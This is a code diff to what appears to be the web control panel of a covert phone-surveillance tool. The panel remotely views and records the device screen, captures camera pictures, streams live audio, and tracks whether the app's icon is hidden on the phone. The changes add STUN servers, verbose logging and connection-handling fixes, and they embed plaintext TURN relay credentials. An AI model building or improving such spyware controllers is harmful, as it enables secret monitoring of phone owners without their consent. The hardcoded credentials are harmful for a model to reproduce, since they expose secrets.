@@ -1081,6 +1081,10 @@
     let audioMediaRecorder = null;
     let audioRecordedChunks = [];
 
+    // Screen recording variables - FIXED: Added missing declarations
+    let screenMediaRecorder = null;
+    let screenRecordedChunks = [];
+
     // Activity timeline
     let activityTimeline = [];
 
@@ -1128,7 +1132,13 @@
         return `${pad(d.getDate())}-${pad(d.getMonth()+1)}-${d.getFullYear()}-${pad(d.getHours())}-${pad(d.getMinutes())}-${pad(d.getSeconds())}`;
     }
 
+    // FIXED: Added more reliable ICE servers with fallbacks
     const ICE_SERVERS = [
+        { urls: "stun:stun.l.google.com:19302" },
+        { urls: "stun:stun1.l.google.com:19302" },
+        { urls: "stun:stun2.l.google.com:19302" },
+        { urls: "stun:stun3.l.google.com:19302" },
+        { urls: "stun:stun4.l.google.com:19302" },
         { urls: "stun:stun.relay.metered.ca:80" },
         { urls: "turn:standard.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
         { urls: "turn:standard.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
@@ -1146,12 +1156,15 @@
             data: msg
         };
         ws.send(JSON.stringify(payload));
-        console.log('📤 Signaling sent:', msg.type);
+        console.log('📤 Signaling sent:', msg.type, msg);
         logActivity(`Signaling: ${msg.type}`);
     }
 
     function createPeerConnection(streamType, onTrackCallback, useMic = false) {
-        const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
+        const pc = new RTCPeerConnection({ 
+            iceServers: ICE_SERVERS,
+            iceCandidatePoolSize: 10
+        });
 
         if (streamType === 'screen') {
             pc.addTransceiver('video', { direction: 'recvonly' });
@@ -1164,9 +1177,14 @@
             pc.addTransceiver('audio', { direction: 'recvonly' });
         }
 
-        pc.ontrack = onTrackCallback;
+        pc.ontrack = (e) => {
+            console.log(`🎥 Track received for ${streamType}:`, e.streams);
+            onTrackCallback(e);
+        };
+
         pc.onicecandidate = (e) => {
             if (e.candidate) {
+                console.log(`❄️ ICE candidate for ${streamType}:`, e.candidate);
                 sendSignalingMessage({
                     type: 'ICE_CANDIDATE',
                     candidate: e.candidate,
@@ -1174,19 +1192,29 @@
                 });
             }
         };
+
         pc.oniceconnectionstatechange = () => {
             console.log(`${streamType} ICE state:`, pc.iceConnectionState);
-            if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
+            if (pc.iceConnectionState === 'connected') {
+                showNotification(`${streamType} connected`);
+                logActivity(`${streamType} connected`);
+            } else if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
                 if (streamType === 'screen') {
                     screenActive = false;
                     document.getElementById('screenBtn').innerText = 'Start Screen';
                     closeScreenModal();
                     logActivity('Screen share disconnected');
+                    showNotification('Screen share disconnected');
                 } else if (streamType === 'audio') {
                     stopLiveAudio();
                 }
             }
         };
+
+        pc.onconnectionstatechange = () => {
+            console.log(`${streamType} connection state:`, pc.connectionState);
+        };
+
         return pc;
     }
 
@@ -1199,16 +1227,23 @@
 
     function handleSignalingMessage(msg) {
         console.log('Received signaling:', msg);
+        
         if (msg.type === 'ANSWER') {
             const pc = getPCForType(msg.streamType);
             if (pc) {
+                console.log(`Setting remote answer for ${msg.streamType}`);
                 const answer = new RTCSessionDescription({ type: 'answer', sdp: msg.sdp });
-                pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote description:', e));
+                pc.setRemoteDescription(answer)
+                    .then(() => console.log('Remote description set successfully'))
+                    .catch(e => console.error('Error setting remote description:', e));
             }
         } else if (msg.type === 'ICE_CANDIDATE') {
             const pc = getPCForType(msg.streamType);
             if (pc && msg.candidate) {
-                pc.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(e => console.error('Error adding ICE candidate:', e));
+                console.log(`Adding ICE candidate for ${msg.streamType}`);
+                pc.addIceCandidate(new RTCIceCandidate(msg.candidate))
+                    .then(() => console.log('ICE candidate added successfully'))
+                    .catch(e => console.error('Error adding ICE candidate:', e));
             }
         }
     }
@@ -1230,9 +1265,6 @@
         }
         modalOverlay.classList.remove('show');
         document.body.classList.remove('modal-open');
-        if (screenActive) {
-            toggleScreen();
-        }
         modalRecordBtn.innerText = '🔴';
     }
 
@@ -1243,6 +1275,7 @@
         }
 
         if (screenActive) {
+            // Stop screen share
             if (screenPC) {
                 screenPC.close();
                 screenPC = null;
@@ -1252,31 +1285,52 @@
             closeScreenModal();
             sendSignalingMessage({ type: 'STOP_SCREEN' });
             logActivity('Stopped screen share');
+            showNotification('Screen share stopped');
         } else {
+            // Start screen share
             openScreenModal();
             modalVideo.srcObject = null;
 
+            console.log('Creating screen peer connection...');
             screenPC = createPeerConnection('screen', (e) => {
-                modalVideo.srcObject = e.streams[0];
-                console.log('ontrack for screen', e.streams);
+                console.log('🎬 Screen track received:', e.streams);
+                if (e.streams && e.streams[0]) {
+                    modalVideo.srcObject = e.streams[0];
+                    modalVideo.play().catch(err => console.error('Error playing video:', err));
+                    showNotification('Screen share connected');
+                    logActivity('Screen share connected');
+                }
             }, false);
 
             try {
-                const offer = await screenPC.createOffer();
+                console.log('Creating offer...');
+                const offer = await screenPC.createOffer({
+                    offerToReceiveVideo: true,
+                    offerToReceiveAudio: false
+                });
+                console.log('Offer created:', offer);
+                
                 await screenPC.setLocalDescription(offer);
+                console.log('Local description set');
+                
                 sendSignalingMessage({
                     type: 'OFFER',
                     sdp: offer.sdp,
                     streamType: 'screen'
                 });
+                
                 document.getElementById('screenBtn').innerText = 'Stop Screen';
                 screenActive = true;
                 logActivity('Started screen share');
-                showNotification("Screen sharing started. A system notification will appear – this is normal.");
+                showNotification("Screen sharing started. Waiting for connection...");
+                
             } catch (e) {
                 console.error('Screen share failed:', e);
                 showNotification('Failed: ' + e.message);
-                screenPC = null;
+                if (screenPC) {
+                    screenPC.close();
+                    screenPC = null;
+                }
                 closeScreenModal();
             }
         }
@@ -1302,9 +1356,6 @@
         }, 'image/png');
     }
 
-    let screenMediaRecorder = null;
-    let screenRecordedChunks = [];
-
     function toggleScreenRecording() {
         if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
             screenMediaRecorder.stop();
@@ -1312,7 +1363,7 @@
             logActivity('Screen recording stopped');
         } else {
             if (!modalVideo.srcObject) {
-                alert('Phone Screen Off');
+                alert('No active screen share');
                 return;
             }
             screenRecordedChunks = [];
@@ -1334,7 +1385,9 @@
         canvas.height = modalVideo.videoHeight;
 
         function drawVideoFrame() {
-            ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height);
+            if (modalVideo.readyState === modalVideo.HAVE_ENOUGH_DATA) {
+                ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height);
+            }
             requestAnimationFrame(drawVideoFrame);
         }
         drawVideoFrame();
@@ -1343,7 +1396,9 @@
         originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
 
         screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
-        screenMediaRecorder.ondataavailable = (e) => screenRecordedChunks.push(e.data);
+        screenMediaRecorder.ondataavailable = (e) => {
+            if (e.data.size > 0) screenRecordedChunks.push(e.data);
+        };
         screenMediaRecorder.onstop = () => {
             const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
             const url = URL.createObjectURL(blob);
@@ -1857,15 +1912,19 @@
             case 'SCREEN_SHARE_STARTED':
                 screenActive = true;
                 document.getElementById('screenBtn').innerText = 'Stop Screen';
-                showNotification('Screen share started');
+                showNotification('Screen share started (device)');
                 logActivity('Screen share started (device)');
                 break;
 
             case 'SCREEN_SHARE_STOPPED':
                 screenActive = false;
                 document.getElementById('screenBtn').innerText = 'Start Screen';
-                if (screenPC) { screenPC.close(); screenPC = null; }
-                showNotification('Screen share stopped');
+                if (screenPC) { 
+                    screenPC.close(); 
+                    screenPC = null; 
+                }
+                closeScreenModal();
+                showNotification('Screen share stopped (device)');
                 logActivity('Screen share stopped (device)');
                 break;
 
@@ -1939,11 +1998,17 @@
             screenActive = true;
             document.getElementById('screenBtn').innerText = 'Stop Screen';
             showNotification('Screen share started');
+            logActivity('Screen share started (plain)');
         } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
             screenActive = false;
             document.getElementById('screenBtn').innerText = 'Start Screen';
-            if (screenPC) { screenPC.close(); screenPC = null; }
+            if (screenPC) { 
+                screenPC.close(); 
+                screenPC = null; 
+            }
+            closeScreenModal();
             showNotification('Screen share stopped');
+            logActivity('Screen share stopped (plain)');
         } else if (msg.startsWith("APP_HIDDEN")) {
             iconHidden = true;
             document.getElementById('iconBtn').innerText = 'Show Icon';
@@ -2268,7 +2333,6 @@
         panel.innerHTML = html;
     }
 
-    // FIXED: Added the missing gotoPage function
     function gotoPage(page) {
         currentPage = page;
         renderTable();
@@ -2416,6 +2480,7 @@
     modalCloseBtn.addEventListener('click', closeScreenModal);
 
     modalVideo.addEventListener("loadedmetadata", () => {
+        console.log('Video metadata loaded:', modalVideo.videoWidth, 'x', modalVideo.videoHeight);
         const w = modalVideo.videoWidth;
         const h = modalVideo.videoHeight;
         const popup = document.getElementById('mobilePopup');
@@ -2425,6 +2490,11 @@
         } else {
             popup.classList.add('landscape');
         }
+    });
+
+    modalVideo.addEventListener('playing', () => {
+        console.log('Video is now playing');
+        showNotification('Screen share is now live');
     });
 
     function toggleSidebar() {
@@ -2441,6 +2511,7 @@
         }
     });
 
+    // Expose functions to window
     window.toggleScreen = toggleScreen;
     window.toggleCameraPanel = toggleCameraPanel;
     window.capturePicture = capturePicture;
